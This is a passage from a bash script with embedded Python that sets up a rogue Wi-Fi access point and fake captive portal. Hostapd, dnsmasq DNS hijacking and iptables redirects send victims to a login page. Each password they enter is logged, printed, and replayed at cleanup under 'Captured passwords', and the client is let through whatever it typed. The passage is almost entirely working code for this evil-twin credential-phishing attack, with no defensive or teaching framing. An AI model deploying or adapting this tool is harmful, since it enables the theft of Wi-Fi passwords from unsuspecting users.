                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                log_entry = f"[{timestamp}] Password received from {client_ip} (MAC {mac}): '{pwd}'\n"
                
                try:
                    with open(PASSWORD_LOG_FILE, "a", encoding='utf-8') as f:
                        f.write(log_entry)
                    print(f"[INFO] Password logged to {PASSWORD_LOG_FILE}")
                except Exception as e:
                    print(f"[ERROR] Failed to log password: {e}")
                
                # Print colored output to console
                print(f"\033[92m[SUCCESS] Password received from {client_ip} (MAC {mac}): '{pwd}'\033[0m")

                # Authorize MAC regardless of password
                if mac != "unknown":
                    print(f"[INFO] Authorizing MAC {mac}...")
                    ipt_del(['FORWARD','-m','mac','--mac-source',mac,'-j','ACCEPT'])
                    ipt_add(['FORWARD','-m','mac','--mac-source',mac,'-j','ACCEPT'])
                    ipt_add(['POSTROUTING','-o',WAN_IFACE,'-j','MASQUERADE'], table="nat")
                    print(f"[INFO] ✓ MAC {mac} authorized for browsing")
                    
                    with open("/tmp/client_authenticated", "w") as f:
                        f.write(f"{client_ip}:{mac}:{pwd}")
                else:
                    print(f"[ERROR] MAC not found for {client_ip}")

                # REDIRECT TO SUCCESS PAGE
                print(f"[INFO] Redirecting {client_ip} to success page")
                self.send_response(302)
                self.send_header('Location', 'http://192.168.10.1/success.html')
                self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
                self.send_header("Connection", "close")
                self.end_headers()
                return
            
            # SUCCESS PAGE HANDLING
            if self.path == '/success.html' or self.path == '/success':
                print(f"[INFO] Serving success page to {client_ip}")
                self.send_file_content('success.html')
                return
            
            # Connectivity checks handling - IMPORTANT: Respond 204 if authenticated
            connectivity_checks = [
                '/generate_204', '/gen_204', '/ncsi.txt', '/hotspot-detect.html',
                '/connectivity_check', '/mobile/status.php', '/check_network_status.txt',
                '/fwlink/', '/redirect', '/success.txt'
            ]
            
            if any(path.startswith(check.lower()) for check in connectivity_checks):
                if self.is_client_authenticated(client_ip):
                    print(f"[INFO] Client {client_ip} authenticated - responding 204 No Content")
                    self.send_response(204)  # No Content = client connected
                    self.send_header("Cache-Control", "no-cache")
                    self.send_header("Connection", "close")
                    self.end_headers()
                    return
                else:
                    print(f"[INFO] Client {client_ip} NOT authenticated - redirect to captive portal")
                    self.send_response(302)
                    self.send_header('Location', 'http://192.168.10.1/index.html')
                    self.send_header("Cache-Control", "no-cache")
                    self.send_header("Connection", "close")
                    self.end_headers()
                    return
            
            # Apple CNA requests handling
            apple_paths = ['/hotspot-detect.html', '/library/test/success.html']
            if any(path.startswith(apple_path.lower()) for apple_path in apple_paths):
                if self.is_client_authenticated(client_ip):
                    print(f"[INFO] Apple CNA - client {client_ip} authenticated")
                    self.send_response(200)
                    self.send_header("Content-type", "text/html")
                    self.send_header("Connection", "close")
                    self.end_headers()
                    self.wfile.write(b"<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>")
                else:
                    print(f"[INFO] Apple CNA - client {client_ip} not authenticated")
                    self.send_response(302)
                    self.send_header('Location', 'http://192.168.10.1/index.html')
                    self.send_header("Connection", "close")
                    self.end_headers()
                return
            
            # Microsoft NCSI handling
            if '/ncsi.txt' in path:
                if self.is_client_authenticated(client_ip):
                    print(f"[INFO] Microsoft NCSI - client {client_ip} authenticated")
                    self.send_response(200)
                    self.send_header("Content-type", "text/plain")
                    self.send_header("Connection", "close")  
                    self.end_headers()
                    self.wfile.write(b"Microsoft NCSI")
                else:
                    print(f"[INFO] Microsoft NCSI - redirect for {client_ip}")
                    self.send_response(302)
                    self.send_header('Location', 'http://192.168.10.1/index.html')
                    self.send_header("Connection", "close")
                    self.end_headers()
                return
            
            # Root path and index.html - ALWAYS SERVE LOGIN PAGE
            if self.path in ['/', '/index.html', '/portal', '/login']:
                if self.is_client_authenticated(client_ip):
                    print(f"[INFO] Client {client_ip} already authenticated - redirect to success page")
                    self.send_response(302)
                    self.send_header('Location', 'http://192.168.10.1/success.html')
                    self.send_header("Connection", "close")
                    self.end_headers()
                else:
                    print(f"[INFO] Serving login page to {client_ip}")
                    self.send_file_content('index.html')
                return
                
            # Favicon
            if self.path == '/favicon.ico':
                self.send_response(204)
                self.send_header("Connection", "close")
                self.end_headers()
                return
            
            # For all other requests, behave based on authentication status
            if self.is_client_authenticated(client_ip):
                print(f"[INFO] Client {client_ip} authenticated - allowing request {self.path}")
                self.send_response(404)  # File not found, but connection ok
                self.send_header("Connection", "close")
                self.end_headers()
            else:
                print(f"[INFO] Generic redirect for {client_ip}: {self.path}")
                self.send_response(302)
                self.send_header('Location', 'http://192.168.10.1/index.html')
                self.send_header("Cache-Control", "no-cache")
                self.send_header("Connection", "close")
                self.end_headers()
                
        except Exception as e:
            print(f"[ERROR] GET handling error: {e}")
            try:
                self.send_response(302)
                self.send_header('Location', 'http://192.168.10.1/index.html')
                self.send_header("Connection", "close")
                self.end_headers()
            except:
                pass

    def do_POST(self):
        """Handle POST requests for forms - NO LONGER USED BUT KEPT FOR COMPATIBILITY"""
        try:
            client_ip = self.client_address[0]
            print(f"[INFO] POST from {client_ip}: {self.path} - redirect to GET")
            
            # Redirect any POST to login page
            self.send_response(302)
            self.send_header('Location', 'http://192.168.10.1/index.html')
            self.send_header("Connection", "close")
            self.end_headers()
                
        except Exception as e:
            print(f"[ERROR] POST handling error: {e}")
            try:
                self.send_response(302)
                self.send_header('Location', 'http://192.168.10.1/index.html')
                self.send_header("Connection", "close")
                self.end_headers()
            except:
                pass

    def get_mac(self, ip):
        try:
            out = subprocess.run(['ip','neigh','show',ip], capture_output=True, text=True, timeout=2).stdout
            for line in out.splitlines():
                for p in line.split():
                    if ':' in p and len(p)==17:
                        return p.lower()
        except: pass
        
        try:
            with open('/proc/net/arp') as f:
                for line in f:
                    if ip in line:
                        cols = line.split()
                        if len(cols) >= 4: 
                            return cols[3].lower()
        except: pass
        
        # Force ARP ping if not found
        try:
            subprocess.run(['ping', '-c', '1', '-W', '1', ip], 
                         capture_output=True, timeout=2)
            # Retry after ping
            out = subprocess.run(['ip','neigh','show',ip], capture_output=True, text=True, timeout=1).stdout
            for line in out.splitlines():
                for p in line.split():
                    if ':' in p and len(p)==17:
                        return p.lower()
        except: pass
        
        return "unknown"

if __name__ == "__main__":
    os.chdir(WWW_DIR)
    
    # Configure socket for quick reuse
    class ReuseAddressTCPServer(socketserver.ThreadingTCPServer):
        allow_reuse_address = True
        
        def server_bind(self):
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            super().server_bind()
    
    with ReuseAddressTCPServer(("", PORT), EnhancedCaptivePortalHandler) as httpd:
        print(f"[INFO] Captive portal with separate pages listening on port {PORT}")
        print(f"[INFO] Login page: http://192.168.10.1/index.html")
        print(f"[INFO] Success page: http://192.168.10.1/success.html")
        print(f"[INFO] Web directory: {WWW_DIR}")
        print(f"[INFO] Password log file: {PASSWORD_LOG_FILE}")
        try: 
            httpd.serve_forever()
        except KeyboardInterrupt: 
            print("[INFO] Server terminated")
PY

# Inject runtime values
sed -e "s|__PORT__|${PORTAL_PORT}|g" \
    -e "s|__DIR__|${PORTAL_DIR}|g" \
    -e "s|__WAN__|${I_OUT}|g" \
    -e "s|__AUTH__|${AUTHORIZED_MAC_FILE}|g" \
    -e "s|__PWDLOG__|${PASSWORD_LOG_FILE}|g" \
    "$PORTAL_DIR/captive_server.py" > "$PORTAL_DIR/captive_server.real.py"
mv "$PORTAL_DIR/captive_server.real.py" "$PORTAL_DIR/captive_server.py"
chmod +x "$PORTAL_DIR/captive_server.py"
chmod +x "$PORTAL_DIR/deauth_monitor.py"

# hostapd config
cat > "$HOSTAPD_CONF" <<EOF
interface=$I_IN
driver=nl80211
ssid=$AP_NAME
hw_mode=g
channel=6
ieee80211n=1
wmm_enabled=1
auth_algs=1
ignore_broadcast_ssid=0
EOF

# dnsmasq config - RESOLVED BIND CONFLICT
cat > "$DNSMASQ_CONF" <<EOF
# Specific interface
interface=$I_IN
bind-interfaces

# Robust DHCP configuration
dhcp-range=${DHCP_RANGE_START},${DHCP_RANGE_END},${DHCP_LEASE}
dhcp-option=3,${AP_IP}
dhcp-option=6,${AP_IP}
dhcp-option=1,255.255.255.0
dhcp-option=28,192.168.10.255

# Authoritative DHCP
dhcp-authoritative

# DNS configuration - redirect all domains
address=/#/${AP_IP}

# Specific connectivity checks
address=/connectivitycheck.gstatic.com/${AP_IP}
address=/clients3.google.com/${AP_IP}
address=/clients.l.google.com/${AP_IP}
address=/captive.apple.com/${AP_IP}
address=/www.apple.com/${AP_IP}
address=/gsp1.apple.com/${AP_IP}
address=/www.msftncsi.com/${AP_IP}
address=/www.msftconnecttest.com/${AP_IP}

# Common domains
address=/google.com/${AP_IP}
address=/www.google.com/${AP_IP}

# Detailed logging for debug
log-queries
log-dhcp
log-facility=/tmp/dnsmasq.log

# Optimizations
cache-size=1000
neg-ttl=60
dhcp-lease-max=50
dhcp-rapid-commit

# Security
no-resolv
no-poll
EOF

# Network setup - IMPROVED VERSION WITH CHECKS
info "Complete interface reset $I_IN"
# Make sure interface is not managed by NetworkManager
nmcli device set "$I_IN" managed no 2>/dev/null || true

ip link set "$I_IN" down 2>/dev/null || true
ip addr flush dev "$I_IN" 2>/dev/null || true
ip route flush dev "$I_IN" 2>/dev/null || true

# Reactivate interface with clean configuration
ip link set "$I_IN" up
sleep 1

info "Configuring $I_IN with IP $AP_IP_CIDR"
ip addr add "$AP_IP_CIDR" dev "$I_IN"

# Verify IP configuration (but not UP status because hostapd will manage it)
if ! ip addr show "$I_IN" | grep -q "$AP_IP"; then
    die "Error configuring IP on $I_IN"
fi

info "IP configured correctly on $I_IN"

info "Enable IP forwarding"
sysctl -w net.ipv4.ip_forward=1 >/dev/null

# IPTABLES: clean old rules only for AP
info "Cleaning old PREROUTING/FORWARD/INPUT rules"
iptables -t nat -F
iptables -F FORWARD
iptables -F INPUT

# Redirect HTTP and DNS to portal - IMPROVED VERSION
info "Setting HTTP (80, 8080, 443) and DNS (53) redirects to captive portal"
# HTTP redirect
iptables -t nat -A PREROUTING -i "$I_IN" -p tcp --dport 80 -j REDIRECT --to-port $PORTAL_PORT
iptables -t nat -A PREROUTING -i "$I_IN" -p tcp --dport 8080 -j REDIRECT --to-port $PORTAL_PORT

# HTTPS redirect - important for modern connectivity checks
iptables -t nat -A PREROUTING -i "$I_IN" -p tcp --dport 443 -j REDIRECT --to-port $PORTAL_PORT

# DNS redirect
iptables -t nat -A PREROUTING -i "$I_IN" -p udp --dport 53 -j REDIRECT --to-port 53
iptables -t nat -A PREROUTING -i "$I_IN" -p tcp --dport 53 -j REDIRECT --to-port 53

# Allow local traffic for DHCP and DNS
iptables -A INPUT -i "$I_IN" -p udp --dport 67 -j ACCEPT  # DHCP server
iptables -A INPUT -i "$I_IN" -p udp --dport 68 -j ACCEPT  # DHCP client  
iptables -A INPUT -i "$I_IN" -p udp --dport 53 -j ACCEPT  # DNS
iptables -A INPUT -i "$I_IN" -p tcp --dport 53 -j ACCEPT  # DNS TCP

# MASQUERADE for WAN traffic
iptables -t nat -C POSTROUTING -o "$I_OUT" -j MASQUERADE 2>/dev/null || \
iptables -t nat -A POSTROUTING -o "$I_OUT" -j MASQUERADE

# Default FORWARD drop, Python server adds authorized MACs
iptables -C FORWARD -i "$I_IN" -o "$I_OUT" -j DROP 2>/dev/null || \
iptables -A FORWARD -i "$I_IN" -o "$I_OUT" -j DROP

# Allow portal access
iptables -C INPUT -i "$I_IN" -p tcp --dport $PORTAL_PORT -j ACCEPT 2>/dev/null || \
iptables -I INPUT 1 -i "$I_IN" -p tcp --dport $PORTAL_PORT -j ACCEPT

# Start services - CORRECT ORDER
info "Starting hostapd to configure AP interface..."
hostapd "$HOSTAPD_CONF" -B -f /tmp/hostapd.log

sleep 3

# Verify hostapd is active
if ! pgrep hostapd >/dev/null; then
    info "hostapd log content:"
    cat /tmp/hostapd.log 2>/dev/null || echo "hostapd log not available"
    die "hostapd failed to start"
fi

info "hostapd started successfully"

# Now verify interface is UP after hostapd
info "Verifying interface $I_IN status after hostapd..."
sleep 2

if ! ip link show "$I_IN" | grep -q "state UP"; then
    info "Attempting to reactivate $I_IN..."
    ip link set "$I_IN" up
    sleep 1
    if ! ip link show "$I_IN" | grep -q "state UP"; then
        info "WARNING: $I_IN might not be completely UP, but continuing..."
    fi
fi

info "Starting dnsmasq with debug..."
# Test configuration
dnsmasq --test --conf-file="$DNSMASQ_CONF" || die "dnsmasq configuration error"

# Start dnsmasq in background with verbose logging
dnsmasq --conf-file="$DNSMASQ_CONF" --no-daemon --log-dhcp --log-queries -v &
DNSMASQ_PID=$!

sleep 2

# Verify dnsmasq is active
if ! kill -0 $DNSMASQ_PID 2>/dev/null; then
    info "Attempting dnsmasq restart..."
    dnsmasq --conf-file="$DNSMASQ_CONF" --no-daemon --log-dhcp --log-queries &
    DNSMASQ_PID=$!
    sleep 2
    if ! kill -0 $DNSMASQ_PID 2>/dev/null; then
        die "dnsmasq failed to start"
    fi
fi

info "dnsmasq started (PID: $DNSMASQ_PID)"

# Verify DHCP binding
info "Verifying DHCP binding..."
sleep 1
if netstat -ulnp 2>/dev/null | grep -q ":67.*dnsmasq"; then
    info "✓ DHCP server active on port 67"
else
    info "⚠ DHCP server might not be listening on port 67"
fi

# Final service status verification
info "Final service status:"
info "  hostapd: $(pgrep hostapd >/dev/null && echo 'ACTIVE' || echo 'INACTIVE')"
info "  dnsmasq: $(kill -0 $DNSMASQ_PID 2>/dev/null && echo 'ACTIVE' || echo 'INACTIVE')"
info "  Interface $I_IN: $(ip link show "$I_IN" | grep -q 'state UP' && echo 'UP' || echo 'DOWN')"

# Test DHCP functionality
echo "$(date): Setup completed" > /tmp/dhcp_debug.log
echo "hostapd PID: $(pgrep hostapd)" >> /tmp/dhcp_debug.log
echo "dnsmasq PID: $DNSMASQ_PID" >> /tmp/dhcp_debug.log

info "DHCP monitor active - Log available at /tmp/dnsmasq.log"

# Start anti-evil twin monitor in background
info "Starting anti-evil twin monitor..."
python3 "$PORTAL_DIR/deauth_monitor.py" "$AP_NAME" "$I_MONITOR" "$I_OUT" "$I_IN" &
DEAUTH_PID=$!

info "AP '$AP_NAME' active, captive portal on $AP_IP:$PORTAL_PORT"
info "Anti-evil twin monitor active on $I_MONITOR (PID: $DEAUTH_PID)"
info "Passwords will be logged to: $PASSWORD_LOG_FILE"
info "Passwords will be printed below (and clients will be automatically authorized for browsing)"

# Improved cleanup handling on termination
cleanup() {
    info "Cleaning up processes..."
    kill $DEAUTH_PID 2>/dev/null || true
    kill $DNSMASQ_PID 2>/dev/null || true
    pkill -f deauth_monitor.py 2>/dev/null || true
    pkill -f captive_server.py 2>/dev/null || true
    pkill hostapd 2>/dev/null || true
    pkill dnsmasq 2>/dev/null || true
    killall dnsmasq 2>/dev/null || true
    
    # Restore managed mode if necessary
    info "Restoring monitor interface..."
    ip link set "$I_MONITOR" down 2>/dev/null || true
    iw "$I_MONITOR" set type managed 2>/dev/null || true
    ip link set "$I_MONITOR" up 2>/dev/null || true
    nmcli device connect "$I_MONITOR" 2>/dev/null || true
    
    # Clean iptables rules only for our rules
    info "Cleaning iptables rules..."
    iptables -t nat -F PREROUTING 2>/dev/null || true
    iptables -F FORWARD 2>/dev/null || true
    
    info "Final DHCP statistics:"
    [ -f /tmp/dnsmasq.log ] && tail -10 /tmp/dnsmasq.log
    
    info "Password log location: $PASSWORD_LOG_FILE"
    [ -f "$PASSWORD_LOG_FILE" ] && echo "Captured passwords:" && cat "$PASSWORD_LOG_FILE"
    
    exit 0
}

trap cleanup SIGINT SIGTERM

# Run python captive portal
info "Captive portal server with separate pages - SEPARATE LOGIN and SUCCESS pages"
python3 "$PORTAL_DIR/captive_server.py"
